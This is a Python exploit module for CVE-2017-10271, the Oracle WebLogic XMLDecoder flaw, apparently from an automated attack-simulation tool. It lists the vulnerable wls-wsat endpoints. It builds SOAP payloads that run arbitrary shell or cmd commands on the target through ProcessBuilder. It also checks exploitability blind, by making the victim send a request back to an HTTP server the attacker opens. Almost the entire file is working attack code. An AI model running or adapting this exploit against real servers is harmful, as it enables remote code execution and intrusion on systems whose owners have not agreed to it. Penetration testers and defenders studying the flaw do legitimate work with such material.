# Exploit based of:
# Kevin Kirsche (d3c3pt10n)
# https://github.com/kkirsche/CVE-2017-10271
# and
# Luffin from Github
# https://github.com/Luffin/CVE-2017-10271
# CVE: CVE-2017-10271

from requests import post, exceptions
from web_rce import WebRCE
from exploit.tools import get_free_tcp_port, get_interface_to_target
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer

import threading
import logging

__author__ = "VakarisZ"

LOG = logging.getLogger(__name__)
# How long server waits for get request in seconds
SERVER_TIMEOUT = 4
# How long to wait for a request to go to vuln machine and then to our server from there. In seconds
REQUEST_TIMEOUT = 2
# How long to wait for response in exploitation. In seconds
EXECUTION_TIMEOUT = 15
URLS = ["/wls-wsat/CoordinatorPortType",
        "/wls-wsat/CoordinatorPortType11",
        "/wls-wsat/ParticipantPortType",
        "/wls-wsat/ParticipantPortType11",
        "/wls-wsat/RegistrationPortTypeRPC",
        "/wls-wsat/RegistrationPortTypeRPC11",
        "/wls-wsat/RegistrationRequesterPortType",
        "/wls-wsat/RegistrationRequesterPortType11"]
# Malicious request's headers:
HEADERS = {
            "Content-Type": "text/xml;charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) "
                          "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
          }


class WebLogicExploiter(WebRCE):
    _TARGET_OS_TYPE = ['linux', 'windows']

    def __init__(self, host):
        super(WebLogicExploiter, self).__init__(host, {'linux': '/tmp/monkey.sh',
                                                       'win32': 'monkey32.exe',
                                                       'win64': 'monkey64.exe'})

    def get_exploit_config(self):
        exploit_config = super(WebLogicExploiter, self).get_exploit_config()
        exploit_config['blind_exploit'] = True
        exploit_config['stop_checking_urls'] = True
        exploit_config['url_extensions'] = URLS
        return exploit_config

    def exploit(self, url, command):
        if 'linux' in self.host.os['type']:
            payload = self.get_exploit_payload('/bin/sh', '-c', command + ' 1> /dev/null 2> /dev/null')
        else:
            payload = self.get_exploit_payload('cmd', '/c', command + ' 1> NUL 2> NUL')
        try:
            post(url, data=payload, headers=HEADERS, timeout=EXECUTION_TIMEOUT, verify=False)
        except Exception as e:
            print('[!] Connection Error')
            print(e)
        return True

    class IndicationHTTPServer(threading.Thread):
        """
        Http server built to wait for GET requests. Because oracle web logic vuln is blind,
        we determine if we can exploit by either getting a GET request from host or not.
        """
        def __init__(self, local_ip, local_port, lock, max_requests=1):
            self._local_ip = local_ip
            self._local_port = local_port
            self.get_requests = 0
            self.max_requests = max_requests
            self._stopped = False
            self.lock = lock
            threading.Thread.__init__(self)
            self.daemon = True

        def run(self):
            class S(BaseHTTPRequestHandler):
                @staticmethod
                def do_GET():
                    LOG.info('Server received a request from vulnerable machine')
                    self.get_requests += 1
            LOG.info('Server waiting for exploited machine request...')
            httpd = HTTPServer((self._local_ip, self._local_port), S)
            httpd.daemon = True
            self.lock.release()
            while not self._stopped and self.get_requests < self.max_requests:
                httpd.handle_request()

            self._stopped = True
            return httpd

        def stop(self):
            self._stopped = True

    def check_if_exploitable(self, url):
        # Server might get response faster than it starts listening to it, we need a lock
        httpd, lock = self._start_http_server()
        payload = self.get_test_payload(ip=httpd._local_ip, port=httpd._local_port)
        try:
            post(url, data=payload, headers=HEADERS, timeout=REQUEST_TIMEOUT, verify=False)
        except exceptions.ReadTimeout:
            # Our request does not get response thus we get ReadTimeout error
            pass
        except Exception as e:
            LOG.error("Something went wrong: %s" % e)
        self._stop_http_server(httpd, lock)
        return httpd.get_requests > 0

    def _start_http_server(self):
        """
        Starts custom http server that waits for GET requests
        :return: httpd (IndicationHTTPServer daemon object handler), lock (acquired lock)
        """
        lock = threading.Lock()
        local_port = get_free_tcp_port()
        local_ip = get_interface_to_target(self.host.ip_addr)
        httpd = self.IndicationHTTPServer(local_ip, local_port, lock)
        lock.acquire()
        httpd.start()
        lock.acquire()
        return httpd, lock

    def _stop_http_server(self, httpd, lock):
        lock.release()
        httpd.join(SERVER_TIMEOUT)
        httpd.stop()

    @staticmethod
    def get_exploit_payload(cmd_base, cmd_opt, command):
        """
        Formats the payload used in exploiting weblogic servers
        :param cmd_base: What command prompt to use eg. cmd
        :param cmd_opt: cmd_base commands parameters. eg. /c (to run command)
        :param command: command itself
        :return: Formatted payload
        """
        empty_payload = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
                  <soapenv:Header>
                    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                      <java>
                        <object class="java.lang.ProcessBuilder">
                          <array class="java.lang.String" length="3" >
                            <void index="0">
                              <string>{cmd_base}</string>
                            </void>
                            <void index="1">
                              <string>{cmd_opt}</string>
                            </void>
                            <void index="2">
                              <string>{cmd_payload}</string>
                            </void>
                          </array>
                          <void method="start"/>
                        </object>
                      </java>
                    </work:WorkContext>
                  </soapenv:Header>
                  <soapenv:Body/>
                </soapenv:Envelope>
                '''
        payload = empty_payload.format(cmd_base=cmd_base, cmd_opt=cmd_opt, cmd_payload=command)
        return payload

    @staticmethod
    def get_test_payload(ip, port):
        """
        Gets payload used for testing whether weblogic server is vulnerable
        :param ip: Server's IP
        :param port: Server's port
        :return: Formatted payload
        """
        generic_check_payload = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
                  <soapenv:Header>
                    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                      <java version="1.8" class="java.beans.XMLDecoder">
                        <void id="url" class="java.net.URL">
                          <string>http://{host}:{port}</string>
                        </void>
                        <void idref="url">
                          <void id="stream" method = "openStream" />
                        </void>
                      </java>
                    </work:WorkContext>
                  </soapenv:Header>
                 <soapenv:Body/>
                </soapenv:Envelope>
                '''
        payload = generic_check_payload.format(host=ip, port=port)
        return payload
